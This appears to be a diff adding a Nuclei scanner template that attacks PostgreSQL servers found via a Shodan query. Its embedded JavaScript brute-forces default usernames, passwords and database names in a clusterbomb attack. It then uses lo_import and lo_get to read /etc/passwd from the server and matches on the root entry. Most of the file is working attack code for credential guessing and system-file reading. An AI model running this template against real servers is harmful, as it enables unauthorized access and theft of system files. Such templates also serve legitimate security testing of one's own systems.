@@ -1,0 +1,54 @@
+id: postgresql-experiment
+info:
+  author: pussycat0x
+  description: 'Read and list the files within the PostgreSQL database,
+
+    '
+  metadata:
+    shodan-query: product:"PostgreSQL"
+  name: PGSQL -EXP
+  reference:
+  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-read
+  severity: info
+  tags: brute,network,postgresql
+javascript:
+- args:
+    Db: '{{database}}'
+    Host: '{{Host}}'
+    Pass: '{{password}}'
+    Port: 5432
+    User: '{{usernames}}'
+  attack: clusterbomb
+  code: "const postgres = require('nuclei/postgres');\nconst client = new postgres.PGClient;\n\
+    const flread = \"SELECT lo_import('/etc/passwd');\"\nfor (let i=0; i < 1; i++){\n\
+    \  connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, flread);\n  const\
+    \ final = to_json(connected) \n  const parsedData = JSON.parse(final);\n  const\
+    \ loImportValue = parsedData.Rows[0].lo_import;\n  const valtw = \"SELECT lo_get(\"\
+    \ + loImportValue +\");\"\n  const qry = [valtw, \"SELECT * from pg_largeobject;\"\
+    ];\n    for (const x of qry){\n    connected =  client.ExecuteQuery(Host, Port,\
+    \ User, Pass, Db, x);\n    Export(connected);\n  }  \n}\n"
+  matchers:
+  - dsl:
+    - success == true
+    type: dsl
+  - regex:
+    - 'root:.*:0:0:'
+    type: regex
+  matchers-condition: and
+  payloads:
+    database:
+    - foresight
+    - postgres
+    - template0
+    - template1
+    - test
+    password:
+    - postgres
+    - password
+    - secret
+    - admin
+    - null
+    usernames:
+    - postgres
+    - meow
+    - admin
